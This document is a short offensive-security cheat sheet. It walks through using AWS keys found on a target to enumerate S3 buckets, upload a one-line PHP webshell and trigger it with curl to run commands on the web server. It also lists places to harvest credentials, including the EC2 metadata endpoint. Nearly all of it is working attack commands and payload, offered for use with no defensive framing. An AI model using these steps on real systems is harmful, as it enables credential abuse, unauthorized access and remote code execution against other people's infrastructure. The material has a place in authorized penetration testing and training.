# AWS S3 CLI Webshell Upload

If AWS credentials are found (e.g., in config files, environment variables, or application source), use the AWS CLI to upload a webshell to an S3 bucket that is synced to or serves a web application.

## Configure Credentials

```bash
# Set credentials from found keys
export AWS_ACCESS_KEY_ID=<ACCESS_KEY>
export AWS_SECRET_ACCESS_KEY=<SECRET_KEY>
export AWS_DEFAULT_REGION=<REGION>   # e.g., us-east-1

# Or use aws configure
aws configure
```

## Enumerate Buckets

```bash
# List accessible buckets
aws s3 ls

# List contents of a bucket
aws s3 ls s3://<bucket-name>/

# List recursively
aws s3 ls s3://<bucket-name>/ --recursive
```

## Upload Webshell

```bash
# Upload PHP webshell
echo '<?php system($_REQUEST["cmd"]); ?>' > shell.php
aws s3 cp shell.php s3://<bucket-name>/shell.php

# Execute via web request (if bucket serves web content)
curl "http://<TARGET>/shell.php?cmd=id"
```

## Notes
- Common credential locations: `~/.aws/credentials`, `.env`, app config files, EC2 instance metadata (`169.254.169.254`)
- Bucket may sync to web root — check if files uploaded are served by the web app
- `aws s3api get-bucket-acl --bucket <name>` to check permissions
- If no direct web access, look for signed URL generation or Lambda triggers
